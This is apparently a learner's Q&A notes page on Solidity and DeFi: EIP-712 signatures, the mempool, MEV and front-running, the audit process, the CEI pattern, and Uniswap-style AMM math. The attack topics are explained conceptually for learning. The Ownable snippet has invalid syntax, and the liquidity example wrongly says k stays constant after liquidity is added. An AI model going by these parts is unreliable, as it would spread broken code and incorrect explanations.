                from: Person({name: "Cow", wallet: 0xCD2a3d9F938E13CD947Ec05AbC7FE734Df8DD826}),
                to: Person({name: "Bob", wallet: 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB}),
                contents: "Hello, Bob!"
            });
    
            uint8 v = 28;
            bytes32 r = 0x4355c47d63924e8a72e509b65029052eb6c299d53a04e167c5775fd466751c9d;
            bytes32 s = 0x07299936d304c153f6443dfa05f40ff007d72911b6f72307f996231605b91562;
    
            assert(DOMAIN_SEPARATOR == 0xf2cee375fa42b42143804025fc449deafd50cc031ca257e0b194a650a912090f);
            assert(hash(mail) == 0xc52c0ee5d84264471806290a3f2c4cecfc5490626bf912d01f240d7a274b371e);
            assert(verify(mail, v, r, s));
            return true;
        }
    }
</code></pre>


<h2>Easily connect EVM networks and chains to your wallet</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://chainlist.org/">link</a></p>

<h2>What is the mempool?</h2>
<p>When a transaction is initiated it uses an RPC_URL, as we know. This URL points to a specific node on the blockchain which, instead of immediately integrating it into its block, places it into its 'memory pool', or 'mempool'. This constitutes the lower tier of workings that enable blockchain.</p><p></p><p>As we know, nodes essentially "take turns" building blocks for the blockchain. So if you send your transaction to a single node, the node will have to wait until it's that node's turn to include your transaction! This could take months!</p><p></p><p>So what the node does is accept your transaction, and add it to the <code>mempool</code>, accessible to other nodes. When another node sees this transaction waiting to be sent, it will pull transactions from the <code>mempool</code> to include in the block, often based on gas paid for that transaction.</p><p></p><p>So this "<code>mempool</code>" is like a waiting room for transactions.</p>

<h2>What is MEV?</h2>
<p>Mev stands for "Maximum Extractable Value", or sometimes "Miner Extractable Value", and it's the value that blockchain node operators and users can extract by ordering transactions in a block in a specific order.</p><p></p><p>Learn more <a target="_blank" rel="noopener noreferrer nofollow" href="https://www.flashbots.net/">here</a></p><p></p><ul><li><p>MEV Protection</p><ul><li><p>Design</p></li><li><p><a target="_blank" rel="nofollow" href="https://docs.flashbots.net/flashbots-protect/overview">Flashbots Protect</a></p></li><li><p><a target="_blank" rel="nofollow" href="https://mevblocker.io/">MEVBlocker</a></p></li><li><p><a target="_blank" rel="nofollow" href="https://securerpc.com/">Securerpc</a></p></li></ul></li></ul>

<h2>What is Front-running?</h2>
<p>Suppose a malicious actor has visibility into the <code>mempool</code> and wants to use this to their advantage. Visibility into the <code>mempool</code> allows someone to effectively predict future transactions.</p><p></p><p>If a malicious actor were to see a transaction in this waiting room that would benefit them, they're able to send <em>their own</em> transaction, paying more gas, skipping the line.</p><p></p><p>The malicious actor's transaction would execute before the victims!</p><p></p><p>This is called Front-Running and is one of the most common forms of MEV.</p><p></p><img src="https://thequestionersbe.joesexperiences.com/uploads/mev.svg">

<h2>What are we as the blockchain industry not so good at by Patrick?</h2>
<ol><li><p>MEV bots</p></li><li><p>Writing stateful fuzzing and invariant test suites</p></li><li><p>wallet and centralisation security</p></li></ol>

<h2>Where to learn solana?</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://youtu.be/amAq-WHAFs8?si=CuFihCBQ2KrVy7H2">https://youtu.be/amAq-WHAFs8?si=CuFihCBQ2KrVy7H2</a> <a target="_blank" rel="noopener noreferrer nofollow" href="https://youtu.be/HOdYZSe1uhE?si=g6XHS8fDm8jxl6kY">https://youtu.be/HOdYZSe1uhE?si=g6XHS8fDm8jxl6kY</a><br><br><a target="_blank" rel="noopener noreferrer nofollow" href="https://www.rareskills.io/solana-tutorial">https://www.rareskills.io/solana-tutorial</a> Another great resource if you don't wanna waste a lot of time watching tutorials</p>

<h2>Recap of Cyfrin Updraft Security Course</h2>
<p>We learned:</p><p>MEV</p><p>Signature Replays</p><p>Re-entrancy attacks</p><p>Audit process</p><p>Stateful fuzzing<br>Invariance</p><p>Arbitrage</p><p>DeFi</p><p>Barring and Lending</p><p>Flash loans<br>EVM compatibility between chains</p><p>Uniswap</p><p>Compoud</p><p>Verifiable randomness</p><p>Centralization</p><p>Denial of Service</p><p>Failure to Initialize</p><p>Access Controls</p><p>Oracle Manipulation</p><p>and so much more...<br></p><p>You know what to do now:</p><p>Show up to the code base - readme</p><p>Go through the scope</p><p>What are we doing/auditing?</p><p>What commit hash?</p><p>What compatibilities are we working with?</p><p>What tokens?</p><p>What chains?</p><p>Do some Recon</p><p>Understanding what the contract is supposed to do at a high level</p><p>You're gonna read the docs</p><p>You're gonna talk to the team</p><p>You're gonna draw some diagrams</p><p>You're gonna take notes, dump your thoughts down on paper</p><p>Start looking through the code</p><p>You know you're not gonna find stuff in the beginning</p><p>You kow you're just trying to figure out what does this code do? How can I understand this code? Is this codedoing what the protocol is intending it to do?</p><p>Yeah it might take me a couple days but I'm just trying to figure out what the code is doing</p><p>I wanna take notes in the code</p><p>I am gonna leave questions, questions for me to follow up on</p><p>Find bugs and vulnerabilities and attack the code like a hacker would</p><p>You notice their test suite isn't very good, you can write stateful fuzzing test suite to find bugs</p><p>You know of many different types of attacks that you can look for off of your Checklist</p><p>Are there any weird ERC20 here?</p><p>Is there MEV I should think about?</p><p></p><p>You've got a game plan!</p><p></p>

<h2>How fees work on ethereum network</h2>
<p>This msg.value is different from the gas costs. Gas costs are deducted separately for the transaction you run, and it is NOT sent to the protocol in question.  It is NOT deducted from msg.value. It's what you pay to include that transaction on the blockchain, and it is used to maintain the overall cost of network. Miners/validators are incentivized to include transactions in blocks based on these fees. </p><p>msg.value != gas cost for the transaction</p><p>msg.value ==  what the protocol function logic demands</p><p>For example, protocol will give you USDC for ETH (garbage example)</p><p>YOu provide eth via msg.value. Protocol deducts the fee for providing you its services</p><p>The rest is used to give you USDC based on the implementation/rate/Math/etc.<br><br><br></p>

<h2>Uniswap v3</h2>
<p>Minting</p><p>Providing liquidity is called minting.</p><p>V2 pool contract mints tokens (LP-tokens) in exchange for liquidity. V3 doesn‚Äôt do that,<br><br><br></p>

<h2>Solidity Challenges to learn syntax</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/RareSkills/Solidity-Exercises">https://github.com/RareSkills/Solidity-Exercises</a></p><p>even forked it <a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/Joesepherus/Solidity-Exercises">here</a></p>

<h2>What is CEI?</h2>
<p>The <strong>Checks-Effects-Interactions (CEI)</strong> pattern is named as such because it emphasizes first verifying conditions (checks), then updating the contract‚Äôs state (effects), and finally interacting with external contracts (interactions).</p><p></p><ul><li><p><strong>Checks</strong>: Ensure all preconditions are met.</p></li><li><p><strong>Effects</strong>: Update the state of the contract. This is crucial to prevent reentrancy attacks, as the state is modified before any external interaction occurs.</p></li><li><p><strong>Interactions</strong>: Perform external calls (like transferring tokens), which are risky and could lead to reentrancy if not handled correctly.<br><br><br></p></li></ul>

<h2>How to add OpenZeppelin Ownable to my smart contract</h2>
<p>Install OpenZeppelin Contracts</p>

<pre><code>npm install @openzeppelin/contracts</code></pre>
<pre><code>// SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    import "@openzeppelin/contracts/access/Ownable.sol";
    contract MyContract is Ownable {
        // need to call the constructor and set the owner as msg.sender
        constructor() Ownable(msg.sender) {}
    
        // only owner can call this function
        function myFunction onlyOwner(){}
    }</code></pre>
    




<h2>Require VS custom error</h2>
<p>Use <code>require</code> for simple checks with basic messages.</p><pre><code>require(balance &gt;= amount, "Insufficient balance");</code></pre><p>Use <code>custom errors</code> for providing mor detailed information about the error and when optimizing for gas efficieny.</p><pre><code>error InsufficientBalance(uint256 available, uint256 required);
    revert InsufficientBalance(balance, amount);</code></pre><p>Why are <code>custom errors</code> more gas efficient? Because the error messages are not stored in the contract's bytecode, which reduced deployment and execution costs.</p><p></p><p>So if I want gas efficient code, I should always use custom errors?</p><p>Yes, if you want <strong>gas-efficient code</strong>, you should prefer using <strong>custom errors</strong> over string messages with <code>require</code>, especially for error handling</p>

<h2>What are different ways of holding liquidity in a DEX?</h2>
<p>To hold liquidity in memory for a decentralized exchange (DEX) without using the square root function (such as in the constant product formula <code>x * y = k</code>), you can consider alternative methods based on the specific needs of your DEX. Some of these include:</p><p></p><h3>1. <strong>Linear Market Maker (LMK)</strong></h3><p>In contrast to the constant product (which often involves using square roots for price determination), a linear market maker keeps a constant linear relationship between the two assets in the pool. For example, a basic formula could be:</p><p><code>y=mx+b</code></p><p>where <code>m</code> and <code>b</code> are constants representing the slope and y-intercept, respectively. In this case, liquidity is held in a linear manner rather than following the square root curve.</p><p></p><h3>2. <strong>Constant Sum Market Maker (CSMM)</strong></h3><p>Another approach is a <strong>constant sum</strong> market maker, where the sum of the two assets in the pool remains constant. The formula would look like:</p><p><code>x+y=S</code></p><p>where <code>S</code> is the constant sum. This model is more suited to stable assets (like pegged currencies) and doesn't require complex calculations like square roots.</p><p></p><h3>3. <strong>Virtual Automated Market Maker (vAMM)</strong></h3><p>A virtual AMM doesn't directly use the liquidity in the pool for price determination, but rather holds "virtual" liquidity based on the price model. For example, using a pre-set price curve (linear, exponential, etc.), liquidity can be held and adjusted in memory according to changes in prices without using the square root.</p><p></p><h3>4. <strong>Order Book with Liquidity Pools</strong></h3><p>Instead of using automated market makers (AMMs), you could implement an <strong>order book</strong> model, which is typically used by centralized exchanges. Liquidity would be held in memory by tracking individual orders (buy and sell) and executing trades based on the price and volume of those orders. This approach doesn't use square roots for pricing since it is based on matching buy and sell orders.</p><p></p><h3>5. <strong>Exponential or Logarithmic Models</strong></h3><p>You could use an exponential or logarithmic function to determine the relationship between the assets in the pool. These models can still create a non-linear relationship but don‚Äôt require square roots. For example, you could use:</p><p><code>y = Ae^{bx}</code></p><p>or</p><p><code>y=Alog‚Å°(x)+B</code></p><p>where <code>A</code>, <code>B</code>, and <code>b</code> are constants, and liquidity can be adjusted dynamically by tracking changes in the variables.</p><p></p><h3>6. <strong>External Pricing Oracles</strong></h3><p>If you want to avoid complex mathematical formulas entirely, you can use <strong>external pricing oracles</strong> to determine the price and liquidity based on off-chain data. These oracles pull in real-time price data from various sources and can update liquidity pools accordingly. This model doesn't involve square roots or complex price models in memory.</p><p>Each of these approaches has different trade-offs, so the choice of method would depend on the type of assets, market behavior, and performance considerations you're aiming for in your DEX.</p>

<h2>Could you remove square root in DEX?</h2>
<p>When you avoid using the square root, the need for calculating prices based on a balanced curve (like a constant product curve) becomes less of an issue. This may simplify the calculations, but the disadvantage is that the relationship between the assets no longer strictly follows a symmetric curve.</p><p></p><p>By removing the square root, your AMM may exhibit different behavior. Specifically:</p><ul><li><p>The price may be less responsive to small changes in liquidity.</p></li><li><p>The price curve could become steeper or less predictable, potentially leading to higher slippage for large trades or price inefficiencies compared to typical constant product AMMs.</p></li></ul><p>In simpler terms, without square roots, the pricing dynamics may behave more <strong>linearly or less efficiently </strong>compared to traditional constant product AMMs.</p><p></p><p>On the other hand:</p><p>Even without using the square root function, the constant product rule is still respected by adjusting the reserves (<code>x</code> and <code>y</code>) based on each transaction. As long as the product <code>reserve0 * reserve1 = k</code> is maintained, the price between the two reserves will be determined by the ratio <code>reserve1 / reserve0</code> after each trade.</p><p>So, while the square root isn't directly calculated, the price and liquidity are still determined in a way that reflects the constant product model by manipulating the reserves and ensuring the product remains constant.</p><p></p><p>So its accurate and legit?</p><ul><li><p><strong>Yes, it's accurate</strong> because it respects the constant product rule (<code>x * y = k</code>) and keeps the liquidity balanced, just like traditional AMMs.</p></li><li><p><strong>Yes, it's legitimate</strong> because this is a commonly used technique in AMM design that does not require the square root operation but still ensures accurate price discovery and liquidity management.</p></li></ul><p></p><p>So if we can do it like that why does uniswap use sqrt?</p><p>The most common use of the square root in Uniswap and similar AMMs is to derive the <strong>price of one asset relative to the other</strong> after a trade. In a constant product AMM, the price between two assets is determined by their reserves:</p><p><code>Price=reserve1/reserve0</code></p><p>However, when you want to get a precise change in price after a trade, especially for large trades, you often calculate <strong>how the price will change in response to a given amount of input</strong>. The square root is involved in these cases because:</p><ul><li><p>After a trade, the reserves are updated such that <code>reserve0 * reserve1 = k</code>.</p></li><li><p>To calculate how the price behaves for each additional token added or removed, the square root helps to ensure that price slippage and the curve adjust accurately for each trade size.</p><p></p></li></ul><blockquote><p>In this case, Uniswap uses the square root for <strong>price discovery</strong> because the relationship between the token amounts in the pool is <strong>quadratic</strong> (not linear), so a direct square root function helps to <strong>map the reserves correctly</strong> when calculating the price.</p></blockquote><p></p><h3><strong>Efficiency in Slippage and Liquidity Management</strong></h3><p>When trading large amounts, the price curve is more <strong>curved</strong> than linear. Using the square root in the pricing formula provides a more <strong>efficient calculation</strong> for larger swaps, which are sensitive to slippage. Slippage refers to how much worse the price is when a larger trade is made due to the non-linear relationship between reserves.</p><ul><li><p>Without the square root, price changes would be <strong>linear</strong>, which would fail to capture the real impact of large trades on the pool's price.</p></li><li><p>The square root adjustment helps to scale the price in a <strong>non-linear</strong> way, offering a more accurate reflection of how much price changes for each additional unit of input.</p></li></ul><p></p><p>In Uniswap V3, concentrated liquidity allows liquidity providers to specify a <strong>price range</strong> in which they provide liquidity. The square root is crucial in computing these price ranges efficiently, as it allows Uniswap V3 to calculate price changes in a <strong>precise, continuous manner</strong> within that range.</p><p>The formula for prices in Uniswap V3 involves using the square root of the ratio between the two reserves, making the calculations efficient in the context of providing concentrated liquidity, where trades happen in smaller ranges but with more precise price adjustments.</p><p></p><h3>Why Not Use Only Multiplication/Division?</h3><p>While using the product <code>k = x * y</code> can provide the basic framework for maintaining liquidity, using the square root offers more precise control over the <strong>price curve</strong> and <strong>slippage</strong> during swaps. The constant product formula maintains the balance, but the square root allows the system to capture the <strong>non-linear relationship</strong> between reserves in a way that ensures better price adjustments and fairness, especially when there's significant trading volume or large trades.</p><p></p><blockquote><p>Simply put, <strong>without the square root, the price would behave in a more linear manner</strong>, and you'd miss out on the critical properties of how liquidity pools change price in response to different trade sizes.</p></blockquote><p></p><h3>Linear VS Non-Linear Models</h3><p><strong>Key Differences:</strong></p><ul><li><p><strong>Linear Model</strong>: The price decreases in a predictable, constant manner.</p><ul><li><p>Every additional unit of <code>reserve0</code> swapped leads to the same linear price drop.</p></li></ul></li><li><p><strong>Square Root Model</strong>: The price decreases more <strong>sharply</strong> as larger trades are made, reflecting <strong>slippage</strong> more accurately. As the size of the trade increases, the price impact becomes more significant.</p><ul><li><p>In the square root model, the price impact grows as you move further along the curve because of the <strong>increasing slippage</strong>. Large trades have a disproportionately larger impact on the price.</p><p></p></li></ul></li></ul><h3><strong>Why is Square Root Better for Larger Trades?</strong></h3><p>In Uniswap, since the price follows the <strong>square root</strong> curve, large trades cause a <strong>larger percentage change</strong> in price. This ensures that <strong>slippage grows with the size of the trade</strong>, providing a <strong>more realistic price discovery</strong> mechanism.</p><ul><li><p><strong>Small trades</strong>: Little slippage.</p></li><li><p><strong>Large trades</strong>: Significant slippage.</p></li></ul><p>In the linear model, <strong>slippage is constant</strong> and doesn't grow with the trade size. It would be much less accurate for price discovery, especially when large amounts are being swapped, as it wouldn't fully account for the <strong>market depth</strong> and <strong>liquidity curve</strong>.</p><p></p><ul><li><p><strong>Linear Calculation</strong>: Simple but less accurate for large trades. Slippage is constant for every additional unit swapped.</p></li><li><p><strong>Square Root Calculation</strong>: Reflects the <strong>non-linear</strong> nature of price changes. Slippage grows with the trade size, which is more efficient for accurately pricing swaps and preventing large trades from exploiting the liquidity pool.</p><p></p></li></ul><h3>Key Takeaway:</h3><ul><li><p><strong>Linear method</strong>: Linear pricing results in a larger <code>amountOut</code> because it assumes a constant rate of conversion between tokens.</p></li><li><p><strong>Non-linear method</strong>: The square root adjustment simulates diminishing returns, leading to a smaller <code>amountOut</code>. This is more accurate for real-world liquidity pools where the price impact increases as you move more of one token into the pool.</p></li></ul>

<h2>Is it possible in solidity test to see gas usage on each function call? </h2>
<p><code>forge test --gas-report</code></p>

<h2>Building DEX like Uniswap</h2>
<p>To implement smart contracts similar to Uniswap, you'll need to write them in Solidity, following these key components:</p><h3>1. <strong>Token Contract (ERC20 Standard)</strong></h3><ul><li><p>Implement or use an existing ERC20 token contract, as the liquidity pools will deal with ERC20 tokens.</p></li></ul><h3>2. <strong>Factory Contract</strong></h3><ul><li><p>Responsible for creating new liquidity pools.</p></li><li><p>Keeps track of all pools.</p></li></ul><h3>3. <strong>Pair (Pool) Contract</strong></h3><ul><li><p>Manages the liquidity for a specific token pair.</p></li><li><p>Implements the logic for adding/removing liquidity and swapping tokens.</p></li><li><p>Uses the constant product formula x√óy=kx \times y = kx√óy=k for maintaining pool balance.</p></li></ul><h3>4. <strong>Router Contract</strong></h3><ul><li><p>Acts as an interface for users to interact with the DEX.</p></li><li><p>Handles adding liquidity, removing liquidity, and swapping tokens.</p></li></ul><p></p><h3>Key Concept: Constant Product Formula</h3><p></p><pre><code>reserve0 * reserve1 = k</code></pre><p>Where:</p><ul><li><p><code>reserve0</code> is the amount of token0 in the liquidity pool.</p></li><li><p><code>reserve1</code> is the amount of token1 in the liquidity pool.</p></li><li><p><code>k</code> is a constant value that remains unchanged (in theory) as long as the ratio between the two tokens is properly maintained.</p></li></ul><p></p><p></p><h3>Liquidity Balance in Practice</h3><ul><li><p><strong>Liquidity Insertion</strong>: When an LP adds liquidity, the reserves (<code>reserve0</code>, <code>reserve1</code>) increase. The LP receives liquidity tokens representing their share of the pool.</p></li><li><p><strong>Swap</strong>: When a user swaps tokens, the contract ensures that the reserves are updated such that the constant product formula is maintained.</p></li><li><p><strong>Liquidity Removal</strong>: When an LP removes liquidity, they get a share of both <code>reserve0</code> and <code>reserve1</code>, proportional to their share of the total liquidity in the pool.</p></li></ul><p></p><h3>Example: Simplified Flow</h3><ol><li><p><strong>Starting Pool</strong>:</p><ul><li><p><code>reserve0 = 1000</code> (Token0)</p></li><li><p><code>reserve1 = 500</code> (Token1)</p></li><li><p><code>k = 1000 * 500 = 500,000</code></p></li></ul></li><li><p><strong>Adding Liquidity</strong>:</p><ul><li><p>A user adds 200 <code>token0</code> and 100 <code>token1</code> to the pool.</p></li><li><p>The new reserves are:</p><ul><li><p><code>reserve0 = 1000 + 200 = 1200</code></p></li><li><p><code>reserve1 = 500 + 100 = 600</code></p></li></ul></li><li><p>The new <code>k</code> is still maintained at the same constant value (<code>1200 * 600 = 720,000</code>).</p></li></ul></li><li><p><strong>Swapping</strong>:</p><ul><li><p>A user swaps 100 <code>token0</code> for <code>token1</code>. The contract calculates the output based on the constant product formula.</p></li><li><p>After the swap, the reserves are updated:</p><ul><li><p><code>reserve0 = 1200 + 100 = 1300</code></p></li><li><p><code>reserve1 = 600 - outputAmount</code></p></li></ul></li><li><p>The <code>outputAmount</code> is calculated such that the product of the reserves (<code>reserve0 * reserve1</code>) stays constant.</p></li></ul></li><li><p><strong>Removing Liquidity</strong>:</p><ul><li><p>An LP decides to remove liquidity, and they burn liquidity tokens. They get a share of the reserves based on their percentage of the total liquidity.</p></li></ul></li></ol><p></p><h3>Code breakdown</h3><ul><li><p><code>addLiquidity</code>: This function allows users to add liquidity to the pool by depositing <code>amount0</code> of <code>token0</code> and <code>amount1</code> of <code>token1</code>. Liquidity tokens are minted based on the geometric mean of the amounts added.</p></li><li><p><code>removeLiquidity</code>: Allows LPs to remove liquidity. They get tokens in proportion to their share of the pool, and the reserves are adjusted.</p></li><li><p><code>swap</code>: Allows users to swap <code>token0</code> for <code>token1</code>. The contract ensures that the constant product formula (<code>reserve0 * reserve1 = k</code>) is maintained after each swap.</p></li><li><p><code>getAmountOut</code>: This function calculates how much output token the user will receive based on the constant product formula.</p></li></ul><p></p><h3>Why Use Proportional Removal?</h3><p>In Uniswap-like liquidity pools, liquidity providers typically deal with shares of the total liquidity rather than absolute amounts of each token. This ensures that when a provider adds or removes liquidity, they do so in proportion to the overall pool, keeping the price impact minimal and maintaining the constant product formula (<code>x * y = k</code>). The proportional removal logic helps preserve this invariance.</p><ul><li><p>The <code>liquidity</code> parameter is the amount of liquidity tokens you want to burn.</p></li><li><p>It represents a fraction of your ownership of the pool.</p></li><li><p>The function then calculates the corresponding amount of each token to withdraw, proportional to your share in the pool.</p></li></ul><h3></h3><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://thequestioners.joesexperiences.com/qaas/741">Example of calculating liquidity</a></p>

<h2>Example of calculating liquidity</h2>
<p>Actually I need to know the liqudity, in this case liqudiit yis 316 when reserve0 is 1000 and reserve1 is 100. When I remove 100 liquidity it decreases liquidity to 216 and calculates the reserve0 = (1000 * 100) / 316 = 684 and reserve1 = 69</p><p></p><h3>Understanding Liquidity Tokens and Reserves</h3><ol><li><p><strong>Liquidity Tokens (</strong><code>totalLiquidity</code><strong>):</strong> These tokens represent a share of the entire pool. The total number of liquidity tokens (<code>totalLiquidity</code>) is proportional to the product of the reserves (<code>reserve0</code> and <code>reserve1</code>).</p></li><li><p><strong>Formula for Liquidity Tokens:</strong> When liquidity is added to the pool, the number of liquidity tokens issued is proportional to the geometric mean of the reserves:</p><pre><code>liquidity = sqrt(reserve0 * reserve1); </code></pre><p>This formula helps maintain the balance in the pool.</p></li><li><p><strong>Removing Liquidity:</strong> When you remove liquidity, you burn a specific amount of liquidity tokens and calculate the amount of <code>reserve0</code> and <code>reserve1</code> to be removed in proportion to the liquidity being burned.</p></li></ol><h3>Example Scenario:</h3><ul><li><p><strong>Initial State:</strong></p><ul><li><p><code>reserve0 = 1000</code></p></li><li><p><code>reserve1 = 100</code></p></li><li><p><code>totalLiquidity = 316</code> (derived from the initial reserves using the formula <code>sqrt(1000 * 100)</code>).</p></li></ul></li><li><p><strong>Removing </strong><code>100</code><strong> Liquidity Tokens:</strong></p></li></ul><ul><li><p>Calculate the share of the pool being removed: <code>100 / 316 ‚âà 0.316</code>.</p></li><li><p>Calculate the amounts of <code>reserve0</code> and <code>reserve1</code> to remove:</p><p><code>amount0 = (reserve0 * 100) / 316 ‚âà (1000 * 100) / 316 ‚âà 316 amount1 = (reserve1 * 100) / 316 ‚âà (100 * 100) / 316 ‚âà 31.6 </code></p></li></ul><ul><li><p><strong>Updated Reserves after Removal:</strong></p><ul><li><p>New <code>reserve0 = 1000 - 316 ‚âà 684</code>.</p></li><li><p>New <code>reserve1 = 100 - 31.6 ‚âà 68.4</code>.</p></li><li><p>New <code>totalLiquidity = 316 - 100 = 216</code>.</p></li></ul></li></ul><h3>Why the Geometric Mean?</h3><p>The use of the geometric mean (<code>sqrt(reserve0 * reserve1)</code>) ensures that the liquidity tokens represent the correct proportion of the pool, maintaining the constant product formula (<code>x * y = k</code>).</p>

<h2>How to calculate sqrt in solidity?</h2>
<pre><code>// This is the typical square root function in Uniswap V2's contract:
    function sqrt(uint y) internal pure returns (uint z) {
        if (y == 0) return 0;
        z = y;
        uint x = (y + 1) / 2;
        while (x &lt; z) {
            z = x;
            x = (y / x + x) / 2;
        }
    }</code></pre>

<h2>Understanding why uniswap uses sqrtPriceX96</h2>
<p>In <strong>Uniswap V3</strong>, the reason <code>sqrtPriceX96</code> is used in this way (and only recalculated when the price changes significantly within a specific "range") is because of the <strong>concentrated liquidity</strong> model. Liquidity providers (LPs) can concentrate their liquidity around specific price ranges, and this means that rather than recalculating the price at every transaction, only the price points that fall within a range where liquidity is concentrated need to be recalculated.</p><p>This is highly optimized because:</p><ul><li><p>The price calculation doesn't need to be repeated for every transaction unless the price crosses into a new range where liquidity is active.</p></li><li><p>The <code>sqrtPriceX96</code> and liquidity calculations are more efficient when dealing with specific price ranges, reducing the computational overhead for swaps in other ranges.</p></li><li><p></p></li></ul><h3>In Your Case:</h3><p>If you're not implementing <strong>concentrated liquidity</strong> (i.e., you don't care about price ranges and are treating your swap as a simple <strong>constant product market maker</strong> like <strong>Uniswap V2</strong>), then calculating <code>sqrtPriceX96</code> on every swap might indeed be unnecessary. Instead, you could use a more direct price formula that doesn't involve frequent recalculations of the square root.</p><h4>The Simpler Alternative:</h4><p>For a <strong>simpler constant product</strong> AMM like in <strong>Uniswap V2</strong>, where you're just keeping a simple relationship like:</p><p><code>reserve0√óreserve1=constant</code></p><p>You don't need to store or calculate the <code>sqrtPriceX96</code> at all. Instead, the swap calculations would focus directly on the reserves, which are updated with every transaction.</p><p>For example, your <code>getAmountOut</code> and <code>getAmountIn</code> functions could work directly with the reserves, without relying on square roots, since that's what the constant product formula governs.</p>

<h2>Why Use Precision?</h2>
<p>The <strong>main purpose</strong> of using precision in smart contracts, especially for things like token swaps, is to handle <strong>fractions and small differences</strong> that would otherwise be lost due to the limitation of Solidity's <code>uint256</code> type (which only stores integers). Here's why it's typically done:</p><ol><li><p><strong>Avoiding Loss of Precision:</strong></p><ul><li><p>Without precision, operations that involve small fractions (such as token swaps, liquidity adding, etc.) could cause significant rounding errors, especially when dealing with large values.</p></li><li><p>Precision helps you perform calculations that respect smaller fractions (e.g., token values down to 18 decimal places) without losing them due to truncation.</p></li></ul></li><li><p><strong>Intermediate Calculations:</strong></p><ul><li><p>The precision allows for more accurate intermediate calculations before the final integer result is used. For example, you could have a token amount that is meant to be 100.5, but Solidity will round it to 100 without precision.</p></li><li><p>When you use <code>PRECISION</code>, you keep the fractional part intact until the final result (e.g., a swap amount) is calculated and rounded for the transfer.</p></li></ul></li></ol><h3>Why You Scale Back Down?</h3><ol><li><p><strong>Dividing by </strong><code>PRECISION</code><strong> at the end</strong>:</p><ul><li><p>The <code>PRECISION</code> value is a scaling factor, and it's typically used for <strong>intermediate calculations</strong>. The final result for token transfers (or other state changes) has to be a whole number (integer) because Solidity only works with integers for token amounts.</p></li><li><p>So, you <strong>scale up for precision during calculations</strong> but scale <strong>down at the last step</strong> before actual transfers or reserve updates. The scaling doesn't affect the final output because tokens only work with integers in practice.</p></li></ul></li></ol><h3>Example to Illustrate:</h3><p>Let's consider an example with token swap logic:</p><ul><li><p>Suppose <code>reserve0</code> and <code>reserve1</code> represent amounts in a liquidity pool with 18 decimal precision (<code>PRECISION = 1e18</code>).</p></li><li><p>You scale the amounts to maintain precision during the calculation (e.g., for intermediate swap or liquidity calculations).</p></li><li><p>When calculating the "amount out" of a swap, you keep the fractions accurate during the entire process.</p></li><li><p><strong>At the end</strong>, the result (e.g., <code>scaledAmountOut</code>) is scaled back down before transferring the tokens because the token contract only accepts integers, not fractional values.</p></li></ul><p></p><p></p><ol><li><p><strong>Handling Small Fractions</strong>: Solidity does not support floating-point arithmetic. By using a <code>PRECISION</code> constant (like <code>1e18</code>), you effectively scale up the numbers to work with large integers that can represent small fractional values.</p></li><li><p><strong>Preventing Loss of Precision</strong>: When dealing with division or operations that could result in a non-integer, you need to maintain the precision to avoid truncation errors.</p></li></ol><h3>What Happens After Operations?</h3><ul><li><p><strong>Scaling Up</strong>: Before performing operations (e.g., multiplying, adding liquidity), you scale the numbers up to maintain precision.</p></li><li><p><strong>Scaling Down</strong>: After computations, especially when you need to return the value in the correct format (e.g., when calculating the square root or output amounts), you scale down to match the expected output.</p></li></ul><p></p><h3>Example of DEX functions:</h3><ol><li><p><strong>In </strong><code>addLiquidity</code>: After scaling up amounts and computing the new liquidity, the actual token transfer should not use the scaled amount directly but the original.</p></li><li><p><strong>In </strong><code>removeLiquidity</code>: Ensure that when transferring tokens back to the user, you are scaling the amounts appropriately back to the original units.</p></li><li><p><strong>In the </strong><code>swap</code><strong> Function</strong>: After computing <code>scaledAmountOut</code>, scale it back to the correct token unit before transferring.</p></li></ol>

<h2>What are the benefits of using sqrtPriceX96 in uniswap v3?</h2>
<p>The real benefit of using <code>sqrtPriceX96</code> in a DEX, as seen in Uniswap V3, lies in its precision and efficiency for handling price calculations, especially when dealing with large ranges of prices in a concentrated liquidity environment. Here‚Äôs a breakdown of the key benefits:</p><h3>1. <strong>Precision Across a Wide Range</strong></h3><ul><li><p><strong>Fixed-Point Arithmetic</strong>: <code>sqrtPriceX96</code> uses fixed-point arithmetic with 96 bits of precision, allowing the representation of prices in a very granular manner. This level of precision is crucial when dealing with assets that can have vastly different values or when prices need to be calculated with minimal rounding errors.</p></li><li><p><strong>Square Root Representation</strong>: The square root allows better handling of price ranges, especially for assets that are traded in large or very small quantities. It ensures that calculations for proportional liquidity and trades are more accurate across different scales.</p></li></ul><h3>2. <strong>Efficient Price Calculations</strong></h3><ul><li><p><strong>Linear vs. Quadratic Growth</strong>: Instead of dealing with the price as a simple ratio of reserves (which grows quadratically), using the square root of the price allows you to perform many operations (like liquidity provisioning and trades) in a linear space, which is computationally more efficient.</p></li><li><p><strong>Avoids Iterative Calculations</strong>: Once <code>sqrtPriceX96</code> is calculated, you avoid iterative computations for each trade or liquidity adjustment. This reduces the gas cost significantly, especially in complex scenarios involving multiple swaps and liquidity changes.</p></li></ul><h3>3. <strong>Facilitates Concentrated Liquidity</strong></h3><ul><li><p><strong>Ticks and Price Ranges</strong>: In Uniswap V3, liquidity is provided within specific price ranges (ticks). Using <code>sqrtPriceX96</code> helps in efficiently managing these ticks by allowing direct computation of liquidity contributions and price impacts within each tick.</p></li><li><p><strong>Liquidity Granularity</strong>: Providers can specify price ranges where their liquidity is active, and <code>sqrtPriceX96</code> helps in managing and updating these ranges dynamically as trades occur, making the DEX more capital efficient.</p></li></ul><h3>4. <strong>Reduces Slippage and Impermanent Loss</strong></h3><ul><li><p><strong>Tighter Price Control</strong>: With the precision offered by <code>sqrtPriceX96</code>, trades are executed closer to the actual market price, reducing slippage.</p></li><li><p><strong>Better Fee Accrual</strong>: Since the price updates are more precise, the fees accrued from trades are better distributed to liquidity providers, which helps in mitigating impermanent loss over time.</p></li></ul><h3>5. <strong>Gas Efficiency</strong></h3><ul><li><p><strong>Less On-Chain Storage</strong>: Instead of storing large or multiple variables for price calculations, storing and updating <code>sqrtPriceX96</code> reduces the need for extensive storage operations, which can lower gas costs.</p></li><li><p><strong>Reduced Computational Overhead</strong>: Many operations are simplified by working in the square root space, which can translate to fewer computational steps and lower gas usage in practice.</p></li></ul><h3>Example Context</h3><p>In a 